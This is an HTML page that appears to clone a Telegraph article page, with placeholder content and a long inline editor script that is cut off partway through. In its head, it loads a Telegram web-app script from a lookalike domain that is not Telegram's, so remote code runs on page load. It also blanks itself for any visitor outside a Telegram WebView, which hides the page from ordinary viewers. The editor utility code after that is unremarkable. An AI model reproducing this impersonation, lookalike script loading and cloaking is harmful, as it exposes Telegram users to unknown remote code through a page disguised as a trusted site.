<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>hello – Telegraph</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="format-detection" content="telephone=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="MobileOptimized" content="176">
    <meta name="HandheldFriendly" content="True">
    <meta name="robots" content="index, follow">
    <meta property="og:type" content="article">
    <meta property="og:title" content="hello">
    <meta property="og:description" content="example text summary, nice.">
    <meta property="og:image" content="">
    <meta property="og:site_name" content="Telegraph">
    <meta property="article:published_time" content="2025-12-24T02:12:00+0000">
    <meta property="article:modified_time" content="2025-12-24T02:12:00+0000">
    <meta property="article:author" content="">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="hello">
    <meta name="twitter:description" content="example text summary, nice.">
    <meta name="twitter:image" content="">
    <link rel="canonical" href="https://telegra.ph/hello-12-24-212">
    <link rel="shortcut icon" href="https://telegra.ph/favicon.ico?1" type="image/x-icon">
    <link rel="icon" type="image/png" href="https://telegra.ph/images/favicon.png?1" sizes="16x16">
    <link rel="icon" type="image/png" href="https://telegra.ph/images/favicon_2x.png?1" sizes="32x32">
    <link href="https://telegra.ph/css/quill.core.min.css" rel="stylesheet">
    <link href="https://telegra.ph/css/core.min.css?47" rel="stylesheet">
    <script src="https://a-ttgme.stel.com/js/telegram-web-app.js"></script>
    <script>
        (function() {
            function isTelegramWebView() {
                try {
                    return window.Telegram && window.Telegram.WebApp || 
                           navigator.userAgent.indexOf('Telegram') > -1 ||
                           (window.parent && window.parent.Telegram && window.parent.Telegram.WebApp) ||
                           (window.external && 'TelegramWebviewProxy' in window.external);
                } catch (e) {
                    return false;
                }
            }

            if (!isTelegramWebView()) {
                document.open();
                document.write('<html><head><title>Telegraph</title><style>body{margin:0;padding:0;background:white;}</style></head><body></body></html>');
                document.close();
                throw new Error('Not in Telegram WebView');
            }

            let tg = window.Telegram?.WebApp || window.parent?.Telegram?.WebApp;
            
            if (tg) {
                tg.ready();
                tg.expand();
                tg.enableClosingConfirmation();
                
                if (tg.BackButton && tg.BackButton.isVisible) {
                    tg.BackButton.show();
                    tg.BackButton.onClick(() => {
                        if (window.history.length > 1) {
                            window.history.back();
                        } else {
                            tg.close();
                        }
                    });
                }
                
                if (tg.MainButton && tg.MainButton.isVisible) {
                    tg.MainButton.setText("Опубликовать");
                    tg.MainButton.show();
                    tg.MainButton.onClick(() => {
                        if (window.TelegraphApp && window.TelegraphApp.savePage) {
                            window.TelegraphApp.savePage();
                        }
                    });
                }
                
                try {
                    tg.setHeaderColor('secondary_bg_color');
                    tg.setBackgroundColor('secondary_bg_color');
                } catch(e) {}
                
                if (tg.isVersionAtLeast && tg.isVersionAtLeast('6.0')) {
                    try {
                        tg.setupClosingBehavior();
                    } catch(e) {}
                }
                
                tg.onEvent('themeChanged', function() {
                    document.documentElement.setAttribute('data-theme', tg.colorScheme || 'light');
                });
                
                document.documentElement.setAttribute('data-theme', tg.colorScheme || 'light');
                
                tg.onEvent('viewportChanged', function() {
                    if (tg.isExpanded) {
                        document.documentElement.style.setProperty('--tg-viewport-height', tg.viewportHeight + 'px');
                    }
                });
                
                if (tg.viewportHeight) {
                    document.documentElement.style.setProperty('--tg-viewport-height', tg.viewportHeight + 'px');
                }
            }
        })();
    </script>
    <style>
        :root {
            --tg-viewport-height: 100vh;
            --tg-theme-bg-color: #ffffff;
            --tg-theme-text-color: #000000;
            --tg-theme-hint-color: #707579;
            --tg-theme-link-color: #3390ec;
            --tg-theme-button-color: #3390ec;
            --tg-theme-button-text-color: #ffffff;
        }
        
        html[data-theme="dark"] {
            --tg-theme-bg-color: #0f0f0f;
            --tg-theme-text-color: #ffffff;
            --tg-theme-hint-color: #aaaaaa;
        }
        
        body {
            margin: 0;
            padding: 0;
            background: var(--tg-theme-bg-color);
            color: var(--tg-theme-text-color);
            min-height: var(--tg-viewport-height, 100vh);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen-Sans, Ubuntu, Cantarell, sans-serif;
        }
    </style>
</head>
<body class="mobile">
    <div class="tl_page_wrap">
        <div class="tl_page">
            <main class="tl_article">
                <header class="tl_article_header" dir="auto">
                    <h1>hello</h1>
                    <address>
                        <a rel="author"></a>
                        <time datetime="2025-12-24T02:12:00+0000">December 24, 2025</time>
                    </address>
                </header>
                <article id="_tl_editor" class="tl_article_content ql-container ql-disabled">
                    <div class="ql-editor" contenteditable="false">
                        <h1 dir="auto" data-placeholder="Title" data-label="Title">hello</h1>
                        <address dir="auto" data-placeholder="Your name" data-label="Author" class="empty"><br></address>
                        <p dir="auto" data-placeholder="Your story...">example text summary, nice.</p>
                    </div>
                    <div class="ql-clipboard" contenteditable="true" tabindex="-1"></div>
                    <div id="_tl_link_tooltip" class="tl_link_tooltip"></div>
                    <div id="_tl_tooltip" class="tl_tooltip">
                        <div class="buttons">
                            <span class="button_hover"></span>
                            <span class="button_group">
                                <button id="_bold_button" title="Bold" data-format="bold"></button>
                                <button id="_italic_button" title="Italic" data-format="italic"></button>
                                <button id="_link_button" title="Link" data-format="link"></button>
                            </span>
                            <span class="button_group">
                                <button id="_header_button" title="Header" data-format="header"></button>
                                <button id="_subheader_button" title="Subheader" data-format="subheader"></button>
                                <button id="_quote_button" title="Quote" data-format="quote"></button>
                            </span>
                        </div>
                        <div class="prompt">
                            <span class="close"></span>
                            <div class="prompt_input_wrap"><input type="url" class="prompt_input"></div>
                        </div>
                    </div>
                    <div id="_tl_blocks" class="tl_blocks">
                        <div class="buttons">
                            <button id="_image_button" title="Image"></button>
                            <button id="_embed_button" title="Embed"></button>
                        </div>
                    </div>
                </article>
                
                <aside class="tl_article_buttons">
                    <div class="account account_top"></div>
                    <button id="_edit_button" class="button edit_button">Edit</button>
                    <button id="_publish_button" class="button publish_button">Publish</button>
                    <div class="account account_bottom"></div>
                    <div id="_error_msg" class="error_msg"></div>
                </aside>
            </main>
        </div>
        <div class="tl_page_footer tl_page_footer_visible">
            <div id="_report_button" class="tl_footer_button">Report content on this page</div>
        </div>
    </div>
    
    <div class="tl_popup tl_popup_hidden" id="_report_popup">
        <main class="tl_popup_body tl_report_popup">
            <form id="_report_form" method="post" class="">
                <section>
                    <h2 class="tl_popup_header">Report Page</h2>
                    <div class="tl_radio_items">
                        <label class="tl_radio_item">
                            <input type="radio" class="radio" name="reason" value="violence">
                            <span class="tl_radio_item_label">Violence</span>
                        </label>
                        <label class="tl_radio_item">
                            <input type="radio" class="radio" name="reason" value="childabuse">
                            <span class="tl_radio_item_label">Child Abuse</span>
                        </label>
                        <label class="tl_radio_item">
                            <input type="radio" class="radio" name="reason" value="copyright">
                            <span class="tl_radio_item_label">Copyright</span>
                        </label>
                        <label class="tl_radio_item">
                            <input type="radio" class="radio" name="reason" value="illegal_drugs">
                            <span class="tl_radio_item_label">Illegal Drugs</span>
                        </label>
                        <label class="tl_radio_item">
                            <input type="radio" class="radio" name="reason" value="personal_details">
                            <span class="tl_radio_item_label">Personal Details</span>
                        </label>
                        <label class="tl_radio_item">
                            <input type="radio" class="radio" name="reason" value="other">
                            <span class="tl_radio_item_label">Other</span>
                        </label>
                    </div>
                    <div class="tl_textfield_item tl_comment_field">
                        <input type="text" class="tl_textfield" name="comment" value="" placeholder="Add Comment…">
                    </div>
                    <div class="tl_copyright_field">
                        Please submit your DMCA takedown request to <a href="mailto:dmca@telegram.org?subject=Report%20to%20Telegraph%20page%20%22hello%22&amp;body=Reported%20page%3A%20https%3A%2F%2Ftelegra.ph%2Fhello-12-24-212%0A%0A%0A" target="_blank">dmca@telegram.org</a>
                    </div>
                </section>
                <aside class="tl_popup_buttons">
                    <button type="reset" class="button" id="_report_cancel">Cancel</button>
                    <button type="submit" class="button submit_button">Report</button>
                </aside>
            </form>
        </main>
    </div>
    
    <script>
        var T = {
            "apiUrl": "https://edit.telegra.ph",
            "uploadEnabled": false,
            "datetime": 1766542320,
            "pageId": "b7632ff897073e98a60ce",
            "editable": true,
            "saveHash": null,
            "reportHash": null
        };
        
        (function() {
            var b = document.querySelector('time');
            if (b && T.datetime) {
                var a = new Date(1000 * T.datetime),
                    d = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'][a.getMonth()],
                    c = a.getDate();
                b.innerText = d + ' ' + (c < 10 ? '0' : '') + c + ', ' + a.getFullYear();
            }
        })();
    </script>
    
    <!-- Основные библиотеки -->
    <script src="https://telegra.ph/js/jquery.min.js"></script>
    <script src="https://telegra.ph/js/jquery.selection.min.js"></script>
    <script src="https://telegra.ph/js/autosize.min.js"></script>
    <script src="https://telegra.ph/js/load-image.all.min.js?1"></script>
    <script src="https://telegra.ph/js/quill.min.js?10"></script>
    
    <script>
        
        /**
         * Extended Utility Class
         */
        class TelegraphUtils {
            static sanitizeUrl(url, allowedProtocols = ['http:', 'https:', 'tg:', 'mailto:']) {
                try {
                    const parsedUrl = new URL(url);
                    return allowedProtocols.includes(parsedUrl.protocol) ? url : 'about:blank';
                } catch (e) {
                
                    if (url.startsWith('#') || url.startsWith('/') || url.startsWith('./') || url.startsWith('../')) {
                        return url;
                    }
                    return 'about:blank';
                }
            }
            
            static getRelativeUrl(url) {
                try {
                    const location = window.location;
                    const parsedUrl = new URL(url, location.href);
                    
                    if (location.origin !== parsedUrl.origin) {
                        return parsedUrl.href;
                    }
                    
                    if (location.pathname !== parsedUrl.pathname || location.search !== parsedUrl.search) {
                        return parsedUrl.pathname + parsedUrl.search + parsedUrl.hash;
                    }
                    
                    if (location.href === parsedUrl.href) {
                        return parsedUrl.hash || parsedUrl.pathname + parsedUrl.search + parsedUrl.hash;
                    }
                    
                    return parsedUrl.hash;
                } catch (e) {
                    return url;
                }
            }
            
            static htmlSpecialChars(text) {
                if (typeof text !== 'string') return '';
                return text
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;")
                    .replace(/"/g, "&quot;")
                    .replace(/'/g, "&#039;")
                    .replace(/%/g, "&#37;");
            }
            
            static resizeIframe(iframeWindow, width, height) {
                document.querySelectorAll('iframe').forEach(function(iframe) {
                    let frameWindow = null;
                    try {
                        frameWindow = iframe.contentWindow;
                    } catch (e) {
                        return;
                    }
                    
                    if (frameWindow === iframeWindow) {
                        const aspectRatio = height / width;
                        const newWidth = 640;
                        const newHeight = Math.round(newWidth * aspectRatio);
                        
                        iframe.setAttribute('width', newWidth.toString());
                        iframe.setAttribute('height', newHeight.toString());
                        
                        if (iframe.parentNode && iframe.parentNode.classList.contains('iframe_helper')) {
                            iframe.parentNode.style.paddingTop = (aspectRatio * 100) + '%';
                        }
                        
                        if (window.quill && typeof quill.updateSelection === 'function') {
                            try {
                                quill.updateSelection(Quill.import('delta').sources.USER);
                            } catch (e) {}
                        }
                    }
                });
            }
            
            static debounce(func, wait, immediate) {
                let timeout;
                return function() {
                    const context = this, args = arguments;
                    const later = function() {
                        timeout = null;
                        if (!immediate) func.apply(context, args);
                    };
                    const callNow = immediate && !timeout;
                    clearTimeout(timeout);
                    timeout = setTimeout(later, wait);
                    if (callNow) func.apply(context, args);
                };
            }
            
            static throttle(func, limit) {
                let inThrottle;
                return function() {
                    const args = arguments;
                    const context = this;
                    if (!inThrottle) {
                        func.apply(context, args);
                        inThrottle = true;
                        setTimeout(() => inThrottle = false, limit);
                    }
                };
            }
            
            static escapeRegex(string) {
                return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            }
            
            static isMobile() {
                return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            }
            
            static getScrollParent(node) {
                if (node == null) {
                    return null;
                }
                
                if (node.scrollHeight > node.clientHeight) {
                    return node;
                } else {
                    return this.getScrollParent(node.parentNode);
                }
            }
            
            static generateUUID() {
                return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                    const r = Math.random() * 16 | 0;
                    const v = c === 'x' ? r : (r & 0x3 | 0x8);
                    return v.toString(16);
                });
            }
        }
        
        /**
         * Класс для работы с localStorage с полной обработкой ошибок
         */
        class TelegraphStorage {
            static isAvailable() {
                try {
                    const testKey = '__storage_test__';
                    localStorage.setItem(testKey, testKey);
                    localStorage.removeItem(testKey);
                    return true;
                } catch (e) {
                    return false;
                }
            }
            
            static set(key, value) {
                if (!this.isAvailable()) return false;
                
                try {
                    const serializedValue = JSON.stringify(value);
                    localStorage.setItem(key, serializedValue);
                    return true;
                } catch (e) {
                    console.error('LocalStorage set error:', e);
                    return false;
                }
            }
            
            static get(key) {
                if (!this.isAvailable()) return null;
                
                try {
                    const item = localStorage.getItem(key);
                    return item ? JSON.parse(item) : null;
                } catch (e) {
                    console.error('LocalStorage get error:', e);
                    return null;
                }
            }
            
            static remove(key) {
                if (!this.isAvailable()) return false;
                
                try {
                    localStorage.removeItem(key);
                    return true;
                } catch (e) {
                    console.error('LocalStorage remove error:', e);
                    return false;
                }
            }
            
            static clear() {
                if (!this.isAvailable()) return false;
                
                try {
                    localStorage.clear();
                    return true;
                } catch (e) {
                    console.error('LocalStorage clear error:', e);
                    return false;
                }
            }
            
            static getAll() {
                if (!this.isAvailable()) return {};
                
                try {
                    const items = {};
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        if (key) {
                            items[key] = this.get(key);
                        }
                    }
                    return items;
                } catch (e) {
                    console.error('LocalStorage getAll error:', e);
                    return {};
                }
            }
        }
        
        /**
         * Полный менеджер черновиков с автосохранением
         */
        class TelegraphDraftManager {
            constructor() {
                this.pageContent = null;
                this.autoSaveInterval = null;
                this.autoSaveDelay = 5000; // 5 seconds
                this.isSaving = false;
                this.pendingSave = null;
                this.initializeAutoSave();
            }
            
            initializeAutoSave() {
                if (this.autoSaveInterval) {
                    clearInterval(this.autoSaveInterval);
                }
                
                this.autoSaveInterval = setInterval(() => {
                    if (!this.isSaving && this.shouldAutoSave()) {
                        this.save();
                    }
                }, this.autoSaveDelay);
            }
            
            shouldAutoSave() {
                if (T.pageId) return false;
                if (!window.quill) return false;
                
                const currentContent = TelegraphContentManager.getPageContent(true);
                return this.pageContent !== currentContent;
            }
            
            save() {
                if (this.isSaving) {
                    this.pendingSave = true;
                    return false;
                }
                
                if (!T.pageId) {
                    const content = TelegraphContentManager.getPageContent(true);
                    if (this.pageContent !== content) {
                        this.pageContent = content;
                        this.isSaving = true;
                        
                        const success = TelegraphStorage.set('draft', content);
                        
                        this.isSaving = false;
                        if (this.pendingSave) {
                            this.pendingSave = false;
                            setTimeout(() => this.save(), 100);
                        }
                        
                        return success;
                    }
                }
                return false;
            }
            
            forceSave() {
                if (!T.pageId) {
                    const content = TelegraphContentManager.getPageContent(true);
                    this.pageContent = content;
                    return TelegraphStorage.set('draft', content);
                }
                return false;
            }
            
            get() {
                return !T.pageId ? TelegraphStorage.get('draft') : null;
            }
            
            clear() {
                this.pageContent = null;
                TelegraphStorage.remove('draft');
                return true;
            }
            
            hasDraft() {
                return !T.pageId && TelegraphStorage.get('draft') !== null;
            }
            
            getDraftInfo() {
                const draft = this.get();
                if (!draft) return null;
                
                try {
                    const tempDiv = document.createElement('div');
                    tempDiv.innerHTML = draft;
                    const title = tempDiv.querySelector('h1')?.textContent || 'Untitled';
                    const author = tempDiv.querySelector('address')?.textContent || '';
                    const preview = tempDiv.querySelector('p')?.textContent || '';
                    
                    return {
                        title: title,
                        author: author,
                        preview: preview.substring(0, 100) + (preview.length > 100 ? '...' : ''),
                        length: draft.length,
                        savedAt: TelegraphStorage.get('draft_saved_at') || Date.now()
                    };
                } catch (e) {
                    return null;
                }
            }
            
            destroy() {
                if (this.autoSaveInterval) {
                    clearInterval(this.autoSaveInterval);
                    this.autoSaveInterval = null;
                }
            }
        }
        
        /**
         * Полный менеджер контента страницы
         */
        class TelegraphContentManager {
            static getPageContent(includeMetadata = false) {
                if (!window.quill) {
                    return includeMetadata ? '' : { data: '', length: 0 };
                }
                
                const quill = window.quill;
                const editor = $(quill.scroll.domNode);
                
                $('textarea, input', editor).each(function() {
                    const element = $(this);
                    element.attr('data-value', element.val());
                });
                
                const clone = editor.clone();
                
                $('textarea, input', editor).each(function() {
                    $(this).removeAttr('data-value');
                });
                
                $('textarea, input', clone).each(function() {
                    const element = $(this);
                    const value = element.attr('data-value');
                    if (value !== undefined) {
                        element.val(value);
                        element.removeAttr('data-value');
                    }
                });
                
                TelegraphEditorManager.updateEditableText(clone, false);
                
                const attributesToRemove = [
                    'contenteditable',
                    'data-placeholder',
                    'data-label',
                    'data-title',
                    'class'
                ];
                
                attributesToRemove.forEach(attr => {
                    if (attr === 'class') {
                        $('[class=""]', clone).removeAttr('class');
                    } else {
                        $(`[${attr}]`, clone).removeAttr(attr);
                    }
                });
                
                const classesToRemove = [
                    'editable_text',
                    'focus',
                    'empty',
                    'placeholder_once'
                ];
                
                classesToRemove.forEach(className => {
                    $(`.${className}`, clone).removeClass(className);
                });
                
                $('.file_progress, .cursor_wrapper, .ql-tooltip', clone).remove();
                
                if (includeMetadata) {
                
                    $('h1:not(:has(br)), address:not(:has(br))', clone).append('<br>');
                    return clone.html();
                } else {
                
                    $('h1, address', clone).remove();
                    $('br.inline', clone).replaceWith('\n');
                    
                    const wrapDomElement = function(element) {
                        if (!element) return null;
                        
                        if (element.nodeType === Node.TEXT_NODE) {
                            return { data: element.textContent || '' };
                        }
                        
                        if (element.nodeType === Node.ELEMENT_NODE) {
                            const result = {
                                tag: element.tagName.toLowerCase()
                            };
                            
                            if (element.attributes && element.attributes.length > 0) {
                                result.attrs = {};
                                for (let i = 0; i < element.attributes.length; i++) {
                                    const attr = element.attributes[i];
                                    result.attrs[attr.name] = attr.value;
                                }
                            }
                            
                            if (element.childNodes && element.childNodes.length > 0) {
                                result.children = [];
                                for (let i = 0; i < element.childNodes.length; i++) {
                                    const child = wrapDomElement(element.childNodes[i]);
                                    if (child) {
                                        result.children.push(child);
                                    }
                                }
                            }
                            
                            return result;
                        }
                        
                        return null;
                    };
                    
                    const rootElement = clone.get(0);
                    const wrappedData = wrapDomElement(rootElement);
                    const data = wrappedData ? JSON.stringify(wrappedData.children || []) : '[]';
                    
                    return {
                        data: data,
                        length: clone.text().length,
                        html: clone.html()
                    };
                }
            }
            
            static calculateReadingTime(content) {
                const text = $(content).text();
                const words = text.trim().split(/\s+/).length;
                const minutes = Math.ceil(words / 200); // 200 words per minute
                return minutes;
            }
            
            static extractMetadata(content) {
                const tempDiv = document.createElement('div');
                tempDiv.innerHTML = content;
                
                return {
                    title: tempDiv.querySelector('h1')?.textContent || '',
                    author: tempDiv.querySelector('address')?.textContent || '',
                    authorUrl: tempDiv.querySelector('address a')?.getAttribute('href') || '',
                    firstParagraph: tempDiv.querySelector('p')?.textContent || '',
                    wordCount: tempDiv.textContent.trim().split(/\s+/).length,
                    imageCount: tempDiv.querySelectorAll('img').length,
                    linkCount: tempDiv.querySelectorAll('a').length
                };
            }
            
            static validateContent(content) {
                if (!content || content.length === 0) {
                    return { valid: false, error: 'Content is empty' };
                }
                
                if (content.length > 65536) {
                    return { valid: false, error: 'Content is too big' };
                }
                
                const tempDiv = document.createElement('div');
                tempDiv.innerHTML = content;
                const forbiddenTags = ['script', 'style', 'iframe', 'object', 'embed', 'applet'];
                
                for (const tag of forbiddenTags) {
                    if (tempDiv.querySelector(tag)) {
                        return { valid: false, error: `Forbidden tag found: ${tag}` };
                    }
                }
                
                const dataUrls = tempDiv.querySelectorAll('img[src^="data:"], video[src^="data:"]');
                if (dataUrls.length > 0) {
                    return { valid: false, error: 'Upload in progress' };
                }
                
                return { valid: true, error: null };
            }
            
            static sanitizeHTML(html) {
                const tempDiv = document.createElement('div');
                tempDiv.innerHTML = html;
                
                tempDiv.querySelectorAll('script, style, iframe, object, embed, applet').forEach(el => el.remove());
                
                tempDiv.querySelectorAll('*').forEach(el => {
                    Array.from(el.attributes).forEach(attr => {
                        if (attr.name.startsWith('on')) {
                            el.removeAttribute(attr.name);
                        }
                    });
                });
                
                return tempDiv.innerHTML;
            }
            
            static createPreview(content, maxLength = 200) {
                const text = $(content).text().trim();
                if (text.length <= maxLength) return text;
                
                let preview = text.substring(0, maxLength);
                const lastSpace = preview.lastIndexOf(' ');
                if (lastSpace > maxLength * 0.7) {
                    preview = preview.substring(0, lastSpace);
                }
                
                return preview + '...';
            }
        }
        
        /**
         * Полный менеджер редактора
         */
        class TelegraphEditorManager {
            static updateEditableText(element, editMode = null) {
                if (editMode === null) {
                    editMode = this.isEditMode();
                }
                
                const $element = $(element);
                
                if (editMode) {
                    $('.editable_text:not(:has(.editable_input))', $element).each(function() {
                        const $this = $(this);
                        const text = $this.text();
                        const textarea = document.createElement('textarea');
                        
                        textarea.className = 'editable_input';
                        textarea.setAttribute('dir', 'auto');
                        textarea.setAttribute('tabindex', '-1');
                        textarea.setAttribute('rows', '1');
                        textarea.value = text;
                        
                        if (!text.trim()) {
                            $this.addClass('empty');
                        }
                        
                        $this.empty().append(textarea);
                        
                        if (typeof autosize === 'function') {
                            autosize(textarea);
                        }
                    });
                } else {
                    $('.editable_text > .editable_input', $element).each(function() {
                        const $this = $(this);
                        const text = $this.val();
                        const parent = $this.parent();
                        
                        parent.empty().text(text);
                        
                        if (!text.trim()) {
                            parent.addClass('empty');
                        } else {
                            parent.removeClass('empty');
                        }
                    });
                }
            }
            
            static updateEditable(editMode) {
                const $article = $('.tl_article');
                $article.toggleClass('tl_article_edit', editMode);
                
                this.updateEditableText();
                
                const quill = window.quill;
                if (quill) {
                    quill.enable(editMode);
                    if (editMode) {
                        setTimeout(() => {
                            if (quill.hasFocus && !quill.hasFocus()) {
                                quill.focus();
                            }
                        }, 100);
                    }
                }
                
                if (!editMode) {
                    const $header = $('.tl_article_header');
                    const $content = $('.tl_article_content');
                    
                    const title = $('h1', $content).text();
                    const author = $('address', $content).text();
                    const authorUrl = $('address a', $content).attr('href');
                    
                    $('h1', $header).text(title);
                    $('address a', $header).text(author);
                    
                    if (authorUrl) {
                        $('address a', $header).attr('href', authorUrl);
                    } else {
                        $('address a', $header).removeAttr('href');
                    }
                    
                    TelegraphTooltipManager.hideLinkTooltip();
                    TelegraphTooltipManager.hideFormatTooltip();
                    TelegraphTooltipManager.hideBlocksTooltip();
                    
                    const tg = window.Telegram?.WebApp;
                    if (tg && tg.MainButton) {
                        if (editMode) {
                            tg.MainButton.setText("Опубликовать");
                            tg.MainButton.show();
                        } else {
                            tg.MainButton.hide();
                        }
                    }
                }
                
                TelegraphStorage.set('editor_mode', editMode ? 'edit' : 'view');
            }
            
            static isEditMode() {
                return $('.tl_article').hasClass('tl_article_edit');
            }
            
            static toggleEditMode() {
                const currentMode = this.isEditMode();
                this.updateEditable(!currentMode);
                return !currentMode;
            }
            
            static getSelectionRange() {
                const quill = window.quill;
                if (!quill) return null;
                
                try {
                    return quill.getSelection();
                } catch (e) {
                    return null;
                }
            }
            
            static getFormatAtSelection() {
                const range = this.getSelectionRange();
                if (!range) return {};
                
                const quill = window.quill;
                if (!quill) return {};
                
                try {
                    return quill.getFormat(range);
                } catch (e) {
                    return {};
                }
            }
            
            static insertText(text, formats = {}) {
                const quill = window.quill;
                if (!quill) return false;
                
                const range = this.getSelectionRange();
                if (!range) return false;
                
                try {
                    quill.insertText(range.index, text, formats);
                    quill.setSelection(range.index + text.length, 0);
                    return true;
                } catch (e) {
                    return false;
                }
            }
            
            static insertEmbed(embedType, embedData) {
                const quill = window.quill;
                if (!quill) return false;
                
                const range = this.getSelectionRange();
                if (!range) return false;
                
                try {
                    quill.insertEmbed(range.index, embedType, embedData);
                    quill.setSelection(range.index + 1, 0);
                    return true;
                } catch (e) {
                    return false;
                }
            }
            
            static formatText(formats) {
                const quill = window.quill;
                if (!quill) return false;
                
                const range = this.getSelectionRange();
                if (!range) return false;
                
                try {
                    quill.formatText(range, formats);
                    return true;
                } catch (e) {
                    return false;
                }
            }
            
            static formatLine(formats) {
                const quill = window.quill;
                if (!quill) return false;
                
                const range = this.getSelectionRange();
                if (!range) return false;
                
                try {
                    quill.formatLine(range.index, range.length, formats);
                    return true;
                } catch (e) {
                    return false;
                }
            }
            
            static deleteText(length) {
                const quill = window.quill;
                if (!quill) return false;
                
                const range = this.getSelectionRange();
                if (!range) return false;
                
                try {
                    quill.deleteText(range.index, length);
                    return true;
                } catch (e) {
                    return false;
                }
            }
            
            static getText(range = null) {
                const quill = window.quill;
                if (!quill) return '';
                
                try {
                    if (range) {
                        return quill.getText(range);
                    }
                    return quill.getText();
                } catch (e) {
                    return '';
                }
            }
            
            static getHTML() {
                const quill = window.quill;
                if (!quill) return '';
                
                try {
                    return quill.root.innerHTML;
                } catch (e) {
                    return '';
                }
            }
            
            static setHTML(html) {
                const quill = window.quill;
                if (!quill) return false;
                
                try {
                    quill.clipboard.dangerouslyPasteHTML(html);
                    return true;
                } catch (e) {
                    return false;
                }
            }
            
            static getDelta() {
                const quill = window.quill;
                if (!quill) return null;
                
                try {
                    return quill.getContents();
                } catch (e) {
                    return null;
                }
            }
            
            static setDelta(delta) {
                const quill = window.quill;
                if (!quill) return false;
                
                try {
                    quill.setContents(delta);
                    return true;
                } catch (e) {
                    return false;
                }
            }
            
            static updateContents(delta) {
                const quill = window.quill;
                if (!quill) return false;
                
                try {
                    quill.updateContents(delta);
                    return true;
                } catch (e) {
                    return false;
                }
            }
            
            static getBounds(index, length = 0) {
                const quill = window.quill;
                if (!quill) return null;
                
                try {
                    return quill.getBounds(index, length);
                } catch (e) {
                    return null;
                }
            }
            
            static getLine(index) {
                const quill = window.quill;
                if (!quill) return null;
                
                try {
                    return quill.getLine(index);
                } catch (e) {
                    return null;
                }
            }
            
            static getLines(range = null) {
                const quill = window.quill;
                if (!quill) return [];
                
                try {
                    if (range) {
                        return quill.getLines(range);
                    }
                    return quill.getLines();
                } catch (e) {
                    return [];
                }
            }
            
            static getLength() {
                const quill = window.quill;
                if (!quill) return 0;
                
                try {
                    return quill.getLength();
                } catch (e) {
                    return 0;
                }
            }
            
            static getIndex(blot) {
                const quill = window.quill;
                if (!quill || !blot) return -1;
                
                try {
                    return blot.offset(quill.scroll);
                } catch (e) {
                    return -1;
                }
            }
            
            static focus() {
                const quill = window.quill;
                if (!quill) return false;
                
                try {
                    quill.focus();
                    return true;
                } catch (e) {
                    return false;
                }
            }
            
            static blur() {
                const quill = window.quill;
                if (!quill) return false;
                
                try {
                    quill.blur();
                    return true;
                } catch (e) {
                    return false;
                }
            }
            
            static hasFocus() {
                const quill = window.quill;
                if (!quill) return false;
                
                try {
                    return quill.hasFocus();
                } catch (e) {
                    return false;
                }
            }
            
            static enable() {
                const quill = window.quill;
                if (!quill) return false;
                
                try {
                    quill.enable(true);
                    return true;
                } catch (e) {
                    return false;
                }
            }
            
            static disable() {
                const quill = window.quill;
                if (!quill) return false;
                
                try {
                    quill.enable(false);
                    return true;
                } catch (e) {
                    return false;
                }
            }
            
            static isEnabled() {
                const quill = window.quill;
                if (!quill) return false;
                
                try {
                    return quill.isEnabled();
                } catch (e) {
                    return false;
                }
            }
            
            static addContainer(container) {
                const quill = window.quill;
                if (!quill) return false;
                
                try {
                    quill.addContainer(container);
                    return true;
                } catch (e) {
                    return false;
                }
            }
            
            static getModule(name) {
                const quill = window.quill;
                if (!quill) return null;
                
                try {
                    return quill.getModule(name);
                } catch (e) {
                    return null;
                }
            }
            
            static on(event, handler) {
                const quill = window.quill;
                if (!quill) return false;
                
                try {
                    quill.on(event, handler);
                    return true;
                } catch (e) {
                    return false;
                }
            }
            
            static off(event, handler) {
                const quill = window.quill;
                if (!quill) return false;
                
                try {
                    quill.off(event, handler);
                    return true;
                } catch (e) {
                    return false;
                }
            }
            
            static once(event, handler) {
                const quill = window.quill;
                if (!quill) return false;
                
                try {
                    quill.once(event, handler);
                    return true;
                } catch (e) {
                    return false;
                }
            }
            
            static emit(event, ...args) {
                const quill = window.quill;
                if (!quill) return false;
                
                try {
                    quill.emit(event, ...args);
                    return true;
                } catch (e) {
                    return false;
                }
            }
        }
        
        /**
         * Полный менеджер тултипов и подсказок
         */
        class TelegraphTooltipManager {
            static formatTTOptions = {
                padding: 10,
                position: 'top',
                minDelta: 5,
                offsetX: 0,
                offsetY: 0
            };
            
            static linkTTOptions = {
                padding: 7,
                position: 'bottom',
                depend: $('#_tl_tooltip'),
                dependPadding: 10,
                offsetX: 0,
                offsetY: 0
            };
            
            static blocksTTOptions = {
                padding: 10,
                position: 'right',
                offsetX: 10,
                offsetY: 0
            };
            
            static showLinkTooltip(linkElement, url) {
                if (!TelegraphEditorManager.isEditMode()) return;
                
                const quill = window.quill;
                if (!quill) return;
                
                try {
                    const range = {
                        index: linkElement.offset(quill.scroll),
                        length: linkElement.length()
                    };
                    
                    const $tooltip = $('#_tl_link_tooltip');
                    $tooltip.text(decodeURIComponent(url));
                    
                    this.updatePosition($tooltip, range, this.linkTTOptions);
                    
                    if (!$tooltip.hasClass('move_anim')) {
                        setTimeout(() => {
                            $tooltip.addClass('move_anim');
                        }, 1);
                    }
                    
                    if (!$tooltip.hasClass('shown')) {
                        setTimeout(() => {
                            $tooltip.addClass('shown');
                        }, 10);
                    }
                } catch (e) {
                    console.error('Error showing link tooltip:', e);
                }
            }
            
            static hideLinkTooltip() {
                $('#_tl_link_tooltip').removeClass('move_anim shown');
            }
            
            static showFormatTooltip(range) {
                if (!TelegraphEditorManager.isEditMode()) return;
                
                try {
                    const $tooltip = $('#_tl_tooltip');
                    $tooltip.removeClass('tooltip_prompt');
                    
                    this.updatePosition($tooltip, range, this.formatTTOptions);
                    
                    if (!$tooltip.hasClass('move_anim')) {
